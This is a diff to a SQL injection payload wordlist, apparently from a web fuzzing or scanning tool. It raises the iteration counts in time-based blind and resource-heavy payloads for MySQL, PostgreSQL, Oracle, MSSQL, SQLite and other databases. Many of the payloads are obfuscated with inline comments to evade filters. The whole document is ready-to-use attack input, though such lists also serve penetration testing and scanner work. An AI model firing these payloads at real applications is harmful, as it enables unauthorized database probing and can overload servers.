-AND/*azx*/5=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(600000000/2))))
-AND/*azx*/5=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(600000000/2))))--/*azx*/-
+AND/*azx*/5=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(2000000000/2))))
+AND/*azx*/5=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(2000000000/2))))--/*azx*/-
 AND/*azx*/ELT(5=5,SLEEP(6))
 AND/*azx*/SLEEP(6)
 AND/*azx*/SLEEP(6)--/*azx*/xvfdf
-AND/*azx*/benchmark(50000000,MD5(1))
+AND/*azx*/benchmark(20000000,MD5(1))
 AND/*azx*/pg_SLEEP(5)--/*azx*/c
 AnD SLEEP(5)#
 AnD SLEEP(5)--
@@ -754,39 +754,39 @@ AnD/*azx*/SLEEP(5)--
 ELT(5=5,SLEEP(6))
 IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR"*/
 MAKE_SET(5=5,SLEEP(6))
-OR 'xxqwx'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),600000000),NULL)
-OR 'xxqwx'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),6000000000),NULL)-- -wfewf
-OR 'xxqwx'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),6000000000),NULL)-- fiuif
+OR 'xxqwx'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),2000000000),NULL)
+OR 'xxqwx'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),20000000000),NULL)-- -wfewf
+OR 'xxqwx'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),20000000000),NULL)-- fiuif
 OR (SELECT 5 FROM (SELECT(SLEEP(6)))xxqwx)-- -
-OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(2000000000/2))))
 OR 5=(SELECT 5 FROM PG_SLEEP(6))
 OR 5=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)
 OR 5=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)
-OR 5=(SELECT COUNT(*) FROM GENERATE_SERIES(1,6000000))
+OR 5=(SELECT COUNT(*) FROM GENERATE_SERIES(1,20000000))
 OR 5=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)
 OR 5=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)
 OR 5=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)-- jree3
 OR 5=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
 OR 5=DBMS_PIPE.RECEIVE_MESSAGE('xxqwx',6)-- -
-OR 5=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(600000000/2))))
+OR 5=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(2000000000/2))))
 OR ELT(5=5,SLEEP(6))
 OR SLEEP(6)
 OR pg_SLEEP(5)#
-OR/*azx*/'xxqwx'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),600000000),NULL)
-OR/*azx*/'xxqwx'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),6000000000),NULL)--/*azx*/-wfewf
-OR/*azx*/'xxqwx'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),6000000000),NULL)--/*azx*/fiuif
+OR/*azx*/'xxqwx'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),2000000000),NULL)
+OR/*azx*/'xxqwx'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),20000000000),NULL)--/*azx*/-wfewf
+OR/*azx*/'xxqwx'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5),0),20000000000),NULL)--/*azx*/fiuif
 OR/*azx*/(SELECT/*azx*/5/*azx*/FROM/*azx*/(SELECT(SLEEP(6)))xxqwx)--/*azx*/-
-OR/*azx*/2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+OR/*azx*/2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(2000000000/2))))
 OR/*azx*/5=(SELECT/*azx*/5/*azx*/FROM/*azx*/PG_SLEEP(6))
 OR/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/ALL_USERS/*azx*/T1,ALL_USERS/*azx*/T2,ALL_USERS/*azx*/T3,ALL_USERS/*azx*/T4,ALL_USERS/*azx*/T5)
 OR/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/DOMAIN.DOMAINS/*azx*/AS/*azx*/T1,DOMAIN.COLUMNS/*azx*/AS/*azx*/T2,DOMAIN.TABLES/*azx*/AS/*azx*/T3)
-OR/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/GENERATE_SERIES(1,6000000))
+OR/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/GENERATE_SERIES(1,20000000))
 OR/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/RDB$FIELDS/*azx*/AS/*azx*/T1,RDB$TYPES/*azx*/AS/*azx*/T2,RDB$COLLATIONS/*azx*/AS/*azx*/T3,RDB$FUNCTIONS/*azx*/AS/*azx*/T4)
 OR/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/SYSMASTER:SYSPAGHDR)
 OR/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/SYSMASTER:SYSPAGHDR)--/*azx*/jree3
 OR/*azx*/5=(SELECT/*azx*/COUNT(*)/*azx*/FROM/*azx*/sysusers/*azx*/AS/*azx*/sys1,sysusers/*azx*/AS/*azx*/sys2,sysusers/*azx*/AS/*azx*/sys3,sysusers/*azx*/AS/*azx*/sys4,sysusers/*azx*/AS/*azx*/sys5,sysusers/*azx*/AS/*azx*/sys6,sysusers/*azx*/AS/*azx*/sys7)
 OR/*azx*/5=DBMS_PIPE.RECEIVE_MESSAGE('xxqwx',6)--/*azx*/-
-OR/*azx*/5=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(600000000/2))))
+OR/*azx*/5=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(2000000000/2))))
 OR/*azx*/ELT(5=5,SLEEP(6))
 OR/*azx*/SLEEP(6)
 OR/*azx*/pg_SLEEP(5)#
@@ -796,10 +796,10 @@ ORDER BY SLEEP(5)--
 ORDER/*azx*/BY/*azx*/SLEEP(5)
 ORDER/*azx*/BY/*azx*/SLEEP(5)#
 ORDER/*azx*/BY/*azx*/SLEEP(5)--
-PROCEDURE ANALYSE(EXTRACTVALUE(5,CONCAT('\',(BENCHMARK(6000000,MD5('xxqwx'))))),1)
-PROCEDURE ANALYSE(EXTRACTVALUE(5,CONCAT('\',(BENCHMARK(6000000,MD5('xxqwx'))))),1)-- -
-PROCEDURE/*azx*/ANALYSE(EXTRACTVALUE(5,CONCAT('\',(BENCHMARK(6000000,MD5('xxqwx'))))),1)
-PROCEDURE/*azx*/ANALYSE(EXTRACTVALUE(5,CONCAT('\',(BENCHMARK(6000000,MD5('xxqwx'))))),1)--/*azx*/-
+PROCEDURE ANALYSE(EXTRACTVALUE(5,CONCAT('\',(BENCHMARK(20000000,MD5('xxqwx'))))),1)
+PROCEDURE ANALYSE(EXTRACTVALUE(5,CONCAT('\',(BENCHMARK(20000000,MD5('xxqwx'))))),1)-- -
+PROCEDURE/*azx*/ANALYSE(EXTRACTVALUE(5,CONCAT('\',(BENCHMARK(20000000,MD5('xxqwx'))))),1)
+PROCEDURE/*azx*/ANALYSE(EXTRACTVALUE(5,CONCAT('\',(BENCHMARK(20000000,MD5('xxqwx'))))),1)--/*azx*/-
 RLIKE (SELECT 5 FROM (SELECT(SLEEP(6)))xxqwx)
 RLIKE SLEEP(6)
 RLIKE/*azx*/(SELECT/*azx*/5/*azx*/FROM/*azx*/(SELECT(SLEEP(6)))xxqwx)
@@ -816,19 +816,19 @@ WAITFOR/*azx*/DELAY/*azx*/'0:0:6'
 \
 \'
 \''
-benchmark(10000000,MD5(1))#
-benchmark(15000000,md5(0x4e446b6e))-9999
-benchmark(15000000,md5(0x4e446b6e))-99999999
-benchmark(150000000,md5(0x4e446b6e))-99999999
-benchmark(50000000,MD5(1))#
+benchmark(20000000,MD5(1))#
+benchmark(20000000,md5(0x4e446b6e))-9999
+benchmark(20000000,md5(0x4e446b6e))-99999999
+benchmark(200000000,md5(0x4e446b6e))-99999999
+benchmark(20000000,MD5(1))#
 or SLEEP(5)
-or benchmark(50000000,MD5(1))-- vv
+or benchmark(20000000,MD5(1))-- vv
 or pg_SLEEP(5)
 or pg_SLEEP(5)#
 or pg_SLEEP(5)--
 or sleep(5)# -
 or/*azx*/SLEEP(5)
-or/*azx*/benchmark(50000000,MD5(1))--/*azx*/vv
+or/*azx*/benchmark(20000000,MD5(1))--/*azx*/vv
 or/*azx*/pg_SLEEP(5)
 or/*azx*/pg_SLEEP(5)#
 or/*azx*/pg_SLEEP(5)--
